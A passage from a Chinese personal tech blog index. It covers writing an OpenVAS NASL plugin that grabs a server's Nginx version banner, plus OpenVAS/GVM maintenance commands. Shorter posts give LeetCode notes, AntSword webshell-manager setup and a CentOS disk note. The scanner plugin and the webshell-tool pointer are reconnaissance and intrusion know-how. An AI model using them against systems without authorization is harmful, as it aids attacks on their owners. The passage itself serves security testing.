display(recv,&quot;\n&quot;);  </code></pre><p>参考：</p><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/81149159">nasl插件详解</a></p><p><a target="_blank" rel="noopener" href="http://books.gigatux.nl/mirror/networksecuritytools/0596007949/toc.html">nessus的nasl脚本手册</a></p><p><a target="_blank" rel="noopener" href="http://michel.arboi.free.fr/nasl2ref/nasl2_reference.pdf">nasl官方手册</a></p><p><a target="_blank" rel="noopener" href="http://nasl.homemoon.top/index.html">nasl插件开发手册-翻译版</a> 比较全</p><p><a target="_blank" rel="noopener" href="http://nasl.homemoon.top/index.html">Nessus安全测试插件编写教程</a> 入门教程</p><h4 id="识别nginx的插件"><a href="#识别nginx的插件" class="headerlink" title="识别nginx的插件"></a>识别nginx的插件</h4><p>插件脚本：</p><pre><code>###############################################################################
# OpenVAS Vulnerability Test
#
# Nginx version page
#
# Authors:
# molly.zhang &lt;molly.zhang@alussinan.org&gt;
#
# Copyright:
# Copyright (C) 2021 molly zhang
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################
if(description)
&#123;
  script_oid(&quot;1.3.6.1.4.1.56487.1.0.75984&quot;);
  script_version(&quot;2021-04-24T15:18:35+0000&quot;);
  script_tag(name:&quot;last_modification&quot;, value:&quot;2021-05-08 15:18:35 +0000 (Sat, 08 May 2021)&quot;);
  script_tag(name:&quot;creation_date&quot;, value:&quot;2021-05-08 14:08:04 +0100 (Sat, 08 May 2021)&quot;);
  script_tag(name:&quot;cvss_base_vector&quot;, value:&quot;AV:N/AC:L/Au:N/C:N/I:N/A:N&quot;);
  script_tag(name:&quot;cvss_base&quot;, value:&quot;5.3&quot;);
  script_name(&quot;Nginx version&quot;);
  script_category(ACT_GATHER_INFO);
  script_copyright(&quot;Copyright (C)：mengli.zhang in 20210507&quot;);
  script_family(&quot;MyNVTS&quot;);
  script_dependencies(&quot;find_service.nasl&quot;, &quot;httpver.nasl&quot;, &quot;global_settings.nasl&quot;);
  script_require_ports(&quot;Services/www&quot;, 80);
  script_exclude_keys(&quot;Settings/disable_cgi_scanning&quot;);
  script_add_preference(name:&quot;Show full HTTP headers in output&quot;, type:&quot;checkbox&quot;, value:&quot;no&quot;, id:1);
  script_tag(name:&quot;summary&quot;, value:&quot;This script detects and reports the Nginx&#39;s Version.&quot;);
  script_tag(name:&quot;qod_type&quot;, value:&quot;remote_banner&quot;);
  exit(0);
&#125;
display(&quot;Hello World .\n&quot;);
display(&quot;Hello World openvas-nasl. \n&quot;);

include(&#39;/var/lib/openvas/plugins/http_func.inc&#39;);
include(&#39;/var/lib/openvas/plugins/global_settings.inc&#39;);
#display(default:80,&quot;\n&quot;);
#port = get_http_port(default:80);
#host = http_host_name(port:port);
display(&quot;start#########\n&quot;);
#display(host,&quot;\n&quot;);

#recv = http_send_recv(port: port, data: str);
#str = string(&quot;GET /index.php HTTP/1.0\r\n\r\n&quot;);
str = string(&quot;GET / HTTP/1.0\r\n\r\n&quot;);
recv = http_send_recv(port: &quot;80&quot;,data:str);

display(recv, &quot;\n&quot;);
state = egrep(pattern:&#39;nginx.*&#39;,string:recv);
display(&quot;state:&quot;,state);
if(state)
&#123;
  display(&#39;nginx version xielou\n&#39;);
&#125;
exit( 0 );</code></pre><p>openvasmd –rebuild –progress</p><p>测试：</p><pre><code>openvas-nasl -Xt 10.27.22.76 nginx_version.nasl</code></pre><pre><code>docker exec -it 337e5d6c9854 bash
cd /usr/local/var/lib/openvas/plugins
vim nginx_version.nasl
cat nginx_version.nasl
openvas-nasl -Xt 10.27.22.76 nginx_version.nasl</code></pre><p>[root@archery-sec9002 supper-user]# docker restart 337e5d6c9854</p><p>重启openvas</p><pre><code>#加载插件
openvassd

#### 8. 重建插件库

openvasmd –rebuild#失败　　这一步成功会在/usr/local/var/cache/openvas 中生成.nvti 文件

因为openvasmd，gvmd自GVM-10起，它已重命名为：gvmd，并且openvas-check-setup已弃用且无用。


gvmd --rebuild-scap=ovaldefs
docker restart 337e5d6c9854
</code></pre><p>sudo service openvas-manager restart;</p><p>sudo service openvas-scanner restart;</p><p>sudo openvasmd –rebuild –progress</p><p>family=”Web application abuses”</p><p>family=”MyNVTs”</p><p>family=”Policy”</p><p>greenbone-nvt-sync –rsync #greenbone-nvt-sync –curl<br>greenbone-scapdata-sync –rsync</p><p>greenbone-certdata-sync –rsync</p><p>查看日志：</p><p>cat /usr/local/var/log/gvm/openvassd.log</p><p>cat /usr/local/var/log/gvm/gvmd.log</p><p>docker查看日志</p><p>[root@archery-sec9002 supper-user]# docker logs openvas0127</p><p>可以通过运行以下命令来查看/ var / log / gvm / *中的所有日志：</p><pre><code>docker logs openvas</code></pre><p><img src="/2021/04/07/openvas-develop/1620456185130.png" alt="1620456185130"></p><pre><code>md   main:MESSAGE:2021-05-08 03h28.04 utc:32273:    Greenbone Vulnerability Manager version 8.0.2 (DB revision 205)
md   main:WARNING:2021-05-08 03h28.04 utc:32273: main: Main process is already running
md   main:MESSAGE:2021-05-08 03h29.24 utc:32318:    Greenbone Vulnerability Manager version 8.0.2 (DB revision 205)
md manage:   INFO:2021-05-08 03h29.24 utc:32318:    Rebuilding SCAP data (ovaldefs).
md manage:WARNING:2021-05-08 03h29.26 utc:32318: sql_prepare_internal: sqlite3_prepare failed: no such column: id
md manage:WARNING:2021-05-08 03h29.26 utc:32318: sqlv: sql_prepare_internal failed
md   main:MESSAGE:2021-05-08 03h32.42 utc:15:    Greenbone Vulnerability Manager version 8.0.2 (DB revision 205)
md   main:   INFO:2021-05-08 03h32.42 utc:15:    Migrating database.
md   main:WARNING:2021-05-08 03h32.42 utc:15: main: databases are already at the supported version
md   main:MESSAGE:2021-05-08 03h32.42 utc:17:    Greenbone Vulnerability Manager version 8.0.2 (DB revision 205)
md manage:   INFO:2021-05-08 03h32.42 utc:17:    Getting users.
md   main:MESSAGE:2021-05-08 03h33.48 utc:26:    Greenbone Vulnerability Manager version 8.0.2 (DB revision 205)
util gpgme:MESSAGE:2021-05-08 03h33.48 utc:27: Setting GnuPG dir to &#39;/usr/local/var/lib/gv</code></pre><p>greenbone-nvt-sync –help</p><p>greenbone-nvt-sync –refresh</p><p>gvmd -h</p><p>openvassd -h</p><link href="//src.wangriyu.wang/lib/Aplayer/APlayer.min.css" rel="stylesheet"><script src="//src.wangriyu.wang/lib/Aplayer/APlayer.min.js"></script><div id="aplayer"></div><script src="/js/player.js"></script></div><div class="article-info article-info-index"><div class="article-count"><span class="post-count">总字数2.4k</span> <span class="post-count">预计阅读12分钟</span></div><div class="clearfix"></div></div></div></article><article id="post-leetcode-daily" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/2021/04/06/leetcode-daily/" class="article-date"><time class="published" datetime="2021-04-06T07:25:40.000Z" itemprop="datePublished">2021-04-06 发布</time> <time class="updated" datetime="2021-04-06T08:29:32.351Z" itemprop="dateUpdated">2021-04-06 更新</time></a></div><div class="article-inner"><input type="hidden" class="isFancy"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/2021/04/06/leetcode-daily/">leetcode-daily</a></h1></header><div class="article-entry" itemprop="articleBody"><h3 id="删除有序数组重复项II"><a href="#删除有序数组重复项II" class="headerlink" title="删除有序数组重复项II"></a>删除有序数组重复项II</h3><p><strong>题目描述：</strong></p><p>给你一个有序数组 nums ，请你 原地 删除重复出现的元素，使每个元素 只出现一次 ，返回删除后数组的新长度。</p><p>不要使用额外的数组空间，你必须在 原地 修改输入数组 并在使用 O(1) 额外空间的条件下完成。</p><p><strong>示例 1：</strong></p><p>输入：nums = [1,1,2]<br>输出：2, nums = [1,2]<br>解释：函数应该返回新的长度 2 ，并且原数组 nums 的前两个元素被修改为 1, 2 。不需要考虑数组中超出新长度后面的元素。</p><p><strong>解题思路：</strong></p><p>因为本体不能额外申请数组空间，因此很容易想到需要一个指针来记录满足条件的位置，一个指针用于遍历数组，因此本题采用双指针很容易做出来。</p><p>慢指针 slow : 指向当前即将放置元素的位置；则 slow - 1 是刚才已经放置了元素的位置。<br>快指针 fast : 向后遍历所有元素；<br>因为最多允许两个重复元素，并且 slow - 2 位置是上上次放置了元素的位置，所以让 nums[fast] 跟 nums[slow - 2] 进行比较。每次都是只允许最多两个元素出现重复，这两个元素的位置在 slow - 1 和 slow - 2。</p><p><strong>思路：</strong>慢指针即满足题目条件的最大索引（最后满足条件数组的长度），快指针用于遍历数组；这里可以想象慢指针指向的是一个新的数组，我们只需要关心慢指针什么时候增加满足条件的元素，即不重复两次的元素，即nums[slow-2]!=nums[fast]；若满足，则添加新元素nums[slow]=nums[fast]，指针后移slow=slow+1。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#不重复两次的元素class Solution(object):</span>
    <span class="token keyword">def</span> <span class="token function">removeDuplicates</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">)</span><span class="token punctuation">:</span>
        slow<span class="token operator">=</span><span class="token number">0</span>
        <span class="token keyword">for</span> fast <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>slow<span class="token operator">&lt;</span><span class="token number">2</span> <span class="token operator">or</span> nums<span class="token punctuation">[</span>slow<span class="token number">-2</span><span class="token punctuation">]</span><span class="token operator">!=</span>nums<span class="token punctuation">[</span>fast<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#不重复两次的元素</span>
                nums<span class="token punctuation">[</span>slow<span class="token punctuation">]</span><span class="token operator">=</span>nums<span class="token punctuation">[</span>fast<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#</span>
                slow<span class="token operator">=</span>slow<span class="token operator">+</span><span class="token number">1</span><span class="token comment" spellcheck="true">#指针后移</span>
        <span class="token keyword">return</span> slow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考：<a target="_blank" rel="noopener" href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-array-ii/solution/fu-xue-ming-zhu-dong-hua-ti-jie-bang-zhu-yrx5/">https://leetcode-cn.com/problems/remove-duplicates-from-sorted-array-ii/solution/fu-xue-ming-zhu-dong-hua-ti-jie-bang-zhu-yrx5/</a></p><link href="//src.wangriyu.wang/lib/Aplayer/APlayer.min.css" rel="stylesheet"><script src="//src.wangriyu.wang/lib/Aplayer/APlayer.min.js"></script><div id="aplayer"></div><script src="/js/player.js"></script></div><div class="article-info article-info-index"><div class="article-count"><div class="article-tag tagcloud"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/leetcode/" rel="tag">leetcode</a></li></ul></div><span class="post-count">总字数538</span> <span class="post-count">预计阅读2分钟</span></div><div class="clearfix"></div></div></div></article><article id="post-pt-antSword" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/2021/03/30/pt-antSword/" class="article-date"><time class="published" datetime="2021-03-30T06:58:08.000Z" itemprop="datePublished">2021-03-30 发布</time> <time class="updated" datetime="2021-04-06T08:10:54.754Z" itemprop="dateUpdated">2021-04-06 更新</time></a></div><div class="article-inner"><input type="hidden" class="isFancy"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/2021/03/30/pt-antSword/">pt-antSword</a></h1></header><div class="article-entry" itemprop="articleBody"><p>首先蚁剑的下载地址：</p><p><a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p><p>其次需要注意：</p><p>在GitHub下载时需要下载两个部分：</p><p>一个是项目核心源码（AntSword），另一个是加载器（AntSword-Loader）；</p><p>加载器则分为三个版本：Mac、Windows、Linux。</p><p>核心源码：</p><p>这个其实就是运行加载其中的exe文件后，选择了工作目录后下载到工作目录里面的zip文件。</p><p>也可以自己去github下载<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a><br>————————————————<br>版权声明：本文为CSDN博主「Ahuuua」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Ahuuua/article/details/109034528">https://blog.csdn.net/Ahuuua/article/details/109034528</a></p><p><img src="/2021/03/30/pt-antSword/1617087539177.png" alt="1617087539177"></p><p>工作目录可以选择antSword-master，然后加载代码成功，手动重启即可。</p><link href="//src.wangriyu.wang/lib/Aplayer/APlayer.min.css" rel="stylesheet"><script src="//src.wangriyu.wang/lib/Aplayer/APlayer.min.js"></script><div id="aplayer"></div><script src="/js/player.js"></script></div><div class="article-info article-info-index"><div class="article-count"><span class="post-count">总字数198</span> <span class="post-count">预计阅读1分钟</span></div><div class="clearfix"></div></div></div></article><article id="post-leetcode-sort" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/2021/03/29/leetcode-sort/" class="article-date"><time class="published" datetime="2021-03-29T12:19:30.000Z" itemprop="datePublished">2021-03-29 发布</time> <time class="updated" datetime="2021-04-06T08:11:07.317Z" itemprop="dateUpdated">2021-04-06 更新</time></a></div><div class="article-inner"><input type="hidden" class="isFancy"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/2021/03/29/leetcode-sort/">leetcode-sort</a></h1></header><div class="article-entry" itemprop="articleBody"><p>排序算法可以分为内部排序和外部排序，内部排序是数据记录在内存中进行排序，而外部排序是因排序的数据很大，一次不能容纳全部的排序记录，在排序过程中需要访问外存。常见的内部排序算法有：插入排序、希尔排序、选择排序、冒泡排序、归并排序、快速排序、堆排序、基数排序等。用一张图概括：</p><p><img src="/2021/03/29/leetcode-sort/1617020746261.png" alt="1617020746261"></p><h2 id="术语铺垫"><a href="#术语铺垫" class="headerlink" title="术语铺垫"></a>术语铺垫</h2><p>有些人可能不知道什么是稳定排序、原地排序、时间复杂度、空间复杂度，我这里先简单解释一下：</p><p>1、稳定排序：如果 a 原本在 b 的前面，且 a == b，排序之后 a 仍然在 b 的前面，则为稳定排序。</p><p>2、非稳定排序：如果 a 原本在 b 的前面，且 a == b，排序之后 a 可能不在 b 的前面，则为非稳定排序。</p><p>3、原地排序：原地排序就是指在排序过程中不申请多余的存储空间，只利用原来存储待排数据的存储空间进行比较和交换的数据排序。</p><p>4、非原地排序：需要利用额外的数组来辅助排序。</p><p>5、时间复杂度：一个算法执行所消耗的时间。</p><p>6、空间复杂度：运行完一个算法所需的内存大小。</p><p>关于时间复杂度</p><p>平方阶 (O(n2)) 排序 各类简单排序：直接插入、直接选择和冒泡排序。</p><p>线性对数阶 (O(nlog2n)) 排序 快速排序、堆排序和归并排序；</p><p>O(n1+§)) 排序，§ 是介于 0 和 1 之间的常数。 希尔排序</p><p>线性阶 (O(n)) 排序 基数排序，此外还有桶、箱排序。</p><p>关于稳定性</p><p>稳定的排序算法：冒泡排序、插入排序、归并排序和基数排序。</p><p>不是稳定的排序算法：选择排序、快速排序、希尔排序、堆排序。</p><p>名词解释：</p><ul><li>n：数据规模</li><li>k：”桶”的个数</li><li>In-place：占用常数内存，不占用额外内存</li><li>Out-place：占用额外内存</li><li>稳定性：排序后 2 个相等键值的顺序和排序之前它们的顺序相同</li></ul><p>1 冒泡排序</p><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/57088609">https://zhuanlan.zhihu.com/p/57088609</a></p><link href="//src.wangriyu.wang/lib/Aplayer/APlayer.min.css" rel="stylesheet"><script src="//src.wangriyu.wang/lib/Aplayer/APlayer.min.js"></script><div id="aplayer"></div><script src="/js/player.js"></script></div><div class="article-info article-info-index"><div class="article-count"><div class="article-tag tagcloud"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/leetcode/" rel="tag">leetcode</a></li></ul></div><span class="post-count">总字数573</span> <span class="post-count">预计阅读2分钟</span></div><div class="clearfix"></div></div></div></article><article id="post-linux-disk" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/2021/03/11/linux-disk/" class="article-date"><time class="published" datetime="2021-03-11T07:17:19.000Z" itemprop="datePublished">2021-03-11 发布</time> <time class="updated" datetime="2021-03-16T07:51:18.750Z" itemprop="dateUpdated">2021-03-16 更新</time></a></div><div class="article-inner"><input type="hidden" class="isFancy"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/2021/03/11/linux-disk/">centos7把/mnt空间合并到/(根目录)</a></h1></header><div class="article-entry" itemprop="articleBody"><p>在使用虚拟机创建centos系统的时候,会发现原本打算分配的空间,有一部分给/mnt分配走了,这样就造成我们的根目录空间不够,所以我们要把/mnt分配走的空间还给根目录.</p></div><div class="article-info article-info-index"><div class="article-count"><div class="article-tag tagcloud"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/" rel="tag">linux</a></li></ul></div><span class="post-count">总字数564</span> <span class="post-count">预计阅读2分钟</span></div><p class="article-more-link"><a href="/2021/03/11/linux-disk/#more">阅读全文 >></a></p><div class="clearfix"></div></div></div></article><nav id="page-nav"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a></nav></div><footer id="footer"><div class="outer"><div id="footer-info"><div class="footer-left"><i class="fa fa-copyright"></i> 2017-2021 冀-18010769-1</div><div class="visit"><span id="busuanzi_container_site_pv" style="display:none"><span id="site-visit" title="本站到访人数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span> </span></span><span>| </span><span id="busuanzi_container_page_pv" style="display:none"><span id="page-visit" title="本站总访问量"><i class="fa fa-eye" aria-hidden="true"></i><span id="busuanzi_value_site_pv"></span></span></span></div><div class="footer-right"><i class="fa fa-heart"></i><a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架"> Hexo</a> Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a></div></div></div></footer></div><script type="application/javascript">var leftWidth,hide=!1;$(".hide-left-col").click(function(){hide=hide?($(".left-col").css("width",leftWidth),$(".left-col .intrude-less").fadeIn(200),$("#tocButton").fadeIn(200),"block"===$("#switch-btn").css("display")&&"block"===$("#switch-area").css("display")||$("#toc").fadeIn(200),$(".hide-left-col").css("left",leftWidth).html('<i class="fa fa-angle-double-left"></i>'),$(".mid-col").css("left",leftWidth),$("#post-nav-button").css("left",leftWidth),$("#post-nav-button > a:nth-child(2)").css("display","block"),!1):(leftWidth=$(".left-col")[0].style.width,$(".left-col").css("width",0),$(".left-col .intrude-less").fadeOut(200),$("#toc").fadeOut(100),$("#tocButton").fadeOut(100),$(".hide-left-col").css("left",0).html('<i class="fa fa-angle-double-right"></i>'),$(".mid-col").css("left",0),$("#post-nav-button").css("left",0),$("#post-nav-button > a:nth-child(2)").css("display","none"),$(".post-list").is(":visible")&&($("#post-nav-button .fa-bars,#post-nav-button .fa-times").toggle(),$(".post-list").toggle()),!0)})</script><script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.3.5/require.min.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax:{inlineMath:[["$$","$$"],["$","$"],["\\(","\\)"]],processEscapes:!0,skipTags:["script","noscript","style","textarea","pre","code"]}}),MathJax.Hub.Queue(function(){var a,e=MathJax.Hub.getAllJax();for(a=0;a<e.length;a+=1)e[a].SourceElement().parentNode.className+=" has-jax"})</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML" async></script><div class="scroll" id="scroll"><a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a> <a href="#comments" title="查看评论"><i class="fa fa-comments-o"></i></a> <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a></div><script>var oOpenInNew={post:".copyright a[href]",friends:"#js-friends a",socail:".social a"};for(var x in oOpenInNew)$(oOpenInNew[x]).attr("target","_blank")</script><script>var titleTime,originTitle=document.title;document.addEventListener("visibilitychange",function(){document.hidden?(document.title="(つェ⊂)"+originTitle,clearTimeout(titleTime)):(document.title="(*´∇｀*)~ "+originTitle,titleTime=setTimeout(function(){document.title=originTitle},2e3))})</script><script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><link href="//cdn.bootcss.com/aos/2.2.0/aos.css" rel="stylesheet"><script type="text/javascript">AOS.init({easing:"ease-out-back",once:!0})</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"live2d_models/live2d-widget-model-izumi"},"display":{"position":"right","width":100,"height":200,"hOffset":-50,"vOffset":-85},"mobile":{"show":false},"react":{"opacityDefault":0.9,"opacityOnHover":0.3},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false});</script></body></html>